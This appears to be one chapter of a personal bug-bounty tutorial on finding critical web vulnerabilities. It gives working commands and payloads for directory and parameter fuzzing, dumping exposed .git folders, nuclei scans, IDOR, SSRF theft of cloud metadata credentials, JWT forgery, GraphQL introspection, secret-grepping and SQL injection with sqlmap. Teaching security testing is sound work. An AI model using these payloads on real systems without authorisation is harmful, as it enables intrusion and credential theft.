# 07 — Actually Finding Critical Vulnerabilities

everything before this folder is recon (finding the doors). this is what you do once you're standing at the door — this is where critical/high severity findings actually come from.

## fuzzing — finding hidden stuff that isn't linked anywhere

```bash
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,bak,zip,env
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403
```
what you're hunting for: `/admin`, `/backup.zip`, `/.env`, `/.git/`, `/api/v1/`, `/swagger.json`, `/.well-known/`, old `/v1/` api versions that still work but got no security patches after `/v2/` shipped.

**exposed `.git` folder** — if `target.com/.git/` returns anything other than 404, the ENTIRE source code + commit history is downloadable:
```bash
git-dumper https://target.com/.git/ ./dumped-source
```
then grep the dumped source for hardcoded api keys, db creds, old removed-but-still-in-history secrets. this single misconfig routinely = critical.

## ffuf for parameter fuzzing (not just directories)

```bash
ffuf -u "https://target.com/api/user?FUZZ=1" -w params-wordlist.txt -mc 200
```
finds hidden parameters like `debug=true`, `admin=1`, `role=admin` that devs left in for testing and forgot to remove.

## nuclei — automated CVE + misconfig scanning

```bash
nuclei -u https://target.com -t cves/ -t exposures/ -t misconfiguration/
```
templates are community-written and updated within hours of new CVEs going public. this is the single highest-leverage tool for finding "yeah that's a known critical CVE" fast across a huge attack surface. run it AFTER you've fingerprinted tech stack (folder 04) so you know which template categories to prioritize.

## IDOR (Insecure Direct Object Reference) — the most common critical bug in real apps

if an endpoint uses a predictable ID and doesn't check "does THIS user actually own THIS resource":
```
GET /api/invoices/1044   -> your invoice
GET /api/invoices/1045   -> someone else's invoice, and it just... returns it
```
test EVERY endpoint that takes an id/uuid by swapping it for another user's id (use two test accounts). this is not a fancy exploit, it's literally changing a number in the URL — and it's consistently one of the top bug bounty payout categories because it's so common and so damaging (full account/data access).

## SSRF -> cloud metadata theft (this is how "medium" becomes "critical")

if an app fetches a URL you control (image upload from URL, webhook, PDF generator, "import from link" features):
```
https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
`169.254.169.254` is the cloud metadata endpoint (AWS/GCP/Azure all have one). if the server is hosted on cloud and the request goes through server-side, you can pull the IAM role's temporary access keys straight off the metadata service — full cloud account compromise from what looked like a simple "fetch this url" feature.

## JWT attacks — check these on every JWT you find

- **`alg: none`** — some libraries still accept a JWT with the algorithm set to `none` and just trust the payload unsigned. change the header, strip the signature, see if it's accepted.
- **algorithm confusion (RS256 -> HS256)** — if the server uses RS256 (public/private key) but doesn't enforce it, you can sign a token with HS256 using the PUBLIC key as the secret (public key is often exposed) and the server verifies it as valid.
- **weak secret brute force** — grab the token, run it through `hashcat` or `jwt_tool` against a wordlist — a surprising number of apps use something like `secret` or `changeme`.
- tool: `jwt_tool` automates all three checks.

## GraphQL introspection

if introspection isn't disabled in production (it very often isn't):
```
POST /graphql
{"query":"{__schema{types{name,fields{name}}}}"}
```
this dumps the ENTIRE api schema — every query, mutation, and field that exists, including admin-only ones that were never meant to be discoverable. from there you probe each one for missing auth checks (basically IDOR again, but on graphql mutations instead of REST endpoints).

## secrets hiding in plain sight — JS files

frontend JS bundles get shipped to every visitor's browser, including whatever the devs accidentally left in there:
```bash
# pull all JS files, grep for common secret patterns
grep -rE "(api[_-]?key|secret|AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35})" *.js
```
`AKIA...` = AWS access key pattern, `AIza...` = google api key pattern. tools like **trufflehog** and **gitleaks** automate this scanning across JS bundles and git history at scale.

## SQLi — still not dead

despite being decades old, still shows up constantly especially in legacy/internal tools:
```
' OR '1'='1
' UNION SELECT null,null,null--
```
`sqlmap -u "https://target.com/page?id=1" --batch --dbs` automates detection + exploitation once you suspect an injectable parameter (error messages, weird behavior on a single quote, response time changes on `SLEEP()` payloads for blind sqli).

## the actual chain, end to end

recon (03) -> subdomain enum (04) -> port/service scan (06) -> fuzz for hidden endpoints (this folder) -> nuclei for known CVEs -> manual testing of auth/IDOR/SSRF on anything custom-built, because automated tools don't catch business-logic flaws — that part is still you, thinking like an attacker, not a scanner.
